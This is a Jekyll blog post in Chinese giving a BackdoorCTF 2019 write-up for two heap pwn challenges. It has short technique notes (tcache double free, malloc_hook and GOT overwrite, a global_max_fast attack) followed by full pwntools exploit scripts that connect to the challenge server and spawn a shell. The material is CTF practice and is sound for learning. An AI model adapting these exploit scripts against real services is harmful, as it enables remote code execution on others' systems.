---
layout: post
title:  "BackdoorCTF 2019-Writeup"
date:   2019-10-28
desc: ""
keywords: ""
categories: [Ctf]
tags: [CTF]
icon: icon-html
---

# BackdoorCTF 2019-Writeup

昨天看了一眼ctftime发现BackdoorCTF还剩6小时结束，就上去翻了俩pwn玩了玩



## babytcache

double free、UAF、有view

限制free5次，没法直接free进unsorted bin

double free fd出堆地址view泄露，edit打heap起始把tcache bin链上的bin数改成7，然后free进unsorted bin

view泄露libc，打malloc_hook

```python
from pwn import *
#context.log_level='debug'
r = remote('51.158.118.84',17002)
#r = process('./babytcache')
elf = ELF('./babytcache')
libc = ELF('./libc.so.6')

def add(index,size,note):
	r.recvuntil('>> ')
	r.sendline('1')
	r.recvuntil('index:')
	r.sendline(str(index))
	r.recvuntil('size:')
	r.sendline(str(size))
	r.recvuntil('data:')
	r.sendline(note)

def edit(index,note):
	r.recvuntil('>> ')
	r.sendline('2')
	r.recvuntil('index:')
	r.sendline(str(index))
	r.recvuntil('data:')
	r.sendline(note)

def free(index):
	r.recvuntil('>> ')
	r.sendline('3')
	r.recvuntil('index:')
	r.sendline(str(index))

def view(index):
	r.recvuntil('>> ')
	r.sendline('4')
	r.recvuntil('index:')
	r.sendline(str(index))

add(0,0x90,'aaaa')
add(1,0x90,'aaaa')

free(0)
free(0)
view(0)
r.recvuntil('Your Note :')
leak = r.recvuntil('\n',drop=True)
heap_ptr = u64(leak.ljust(8,'\x00'))
log.success('heap_ptr:'+hex(heap_ptr))
fuck_addr = heap_ptr-0x250
edit(0,p64(fuck_addr))
add(2,0x90,p64(heap_ptr))
add(3,0x90,p64(0)+p64(0x7))

free(2)
view(0)
r.recvuntil('Your Note :')
leak = r.recvuntil('\n',drop=True)
main_arena = u64(leak.ljust(8,'\x00'))-96
log.success('main_arena:'+hex(main_arena))
libc_base = main_arena-0x10-libc.sym['__malloc_hook']
log.success('libc_base:'+hex(libc_base))
malloc_hook = main_arena-0x10
log.success('malloc_hook:'+hex(malloc_hook))
one = libc_base + 0x10a38c
log.success('one:'+hex(one))


add(4,0x60,'aaaa')
free(4)
free(4)
edit(4,p64(malloc_hook))
add(5,0x60,p64(malloc_hook))
add(6,0x60,p64(one))

r.recvuntil('>> ')
r.sendline('1')
r.recvuntil('index:')
r.sendline('7')
r.recvuntil('size:')
r.sendline('10')


r.interactive()
```



## babyheap

ubuntu16

UAF

free直接进unsortedbin进不去fastbin

unsortedbin打global_max_fast

UAF改fd和bk，fd为0，bk改两字节

`global_max_fast = main_area+88+0x3c67f8- 0x3c4b78`

需要爆破，16分之1

然后可以UAF+fastbin attack打堆地址，把需要用的got表写进去

edit把free_got改成puts_plt，free(got)泄露libc，然后edit把free_got改成system，free一个/bin/sh

```python
from pwn import * 
r = remote('51.158.118.84',17001)
#r = process('./babyheap')
elf = ELF('./babyheap')
libc = ELF('./libc.so.6')
context.log_level = 'debug'
def add(index,size,data):
	r.recvuntil('>> ')
	r.sendline('1')
	r.recvuntil('index:')
	r.sendline(str(index))
	r.recvuntil('size:')
	r.sendline(str(size))
	r.recvuntil('data:')
	r.sendline(data)

def edit(index,data):
	r.recvuntil('>> ')
	r.sendline('2')
	r.recvuntil('index:')
	r.sendline(str(index))
	r.recvuntil('data:')
	r.send(data)

def free(index):
	r.recvuntil('>> ')
	r.sendline('3')
	r.recvuntil('index:')
	r.sendline(str(index))


add(0,0x60,'fuck')
add(1,0x60,'fuck')
add(2,0x60,'fuck')
add(3,0x60,'/bin/sh\x00')

free(0)
edit(0,p64(0)+p16(0x67f8-0x10))
add(4,0x60,'fuck')

free(1)

free(2)
edit(2,p64(0x6020bd))
add(5,0x60,'fuck')

atoi_got = 0x602068

free_plt = elf.plt['free']
free_got = elf.got['free']
puts_plt = elf.plt['puts']

log.info('freegot:'+hex(free_got))
log.info('putsplt:'+hex(puts_plt))
payload ='\x02'*11+p64(0)+p64(0x60)*8+p64(free_got)+p64(atoi_got)
add(6,0x60,payload)
#free(0)

edit(0,p64(puts_plt))

free(1)
r.recvline()
leak = r.recvuntil('\n',drop=True)
libc_base = u64(leak.ljust(8,'\x00'))-libc.sym['atoi']
log.success('libc_base:'+hex(libc_base))
system = libc_base+libc.sym['system']
edit(0,p64(system))
free(3)
r.interactive()
```

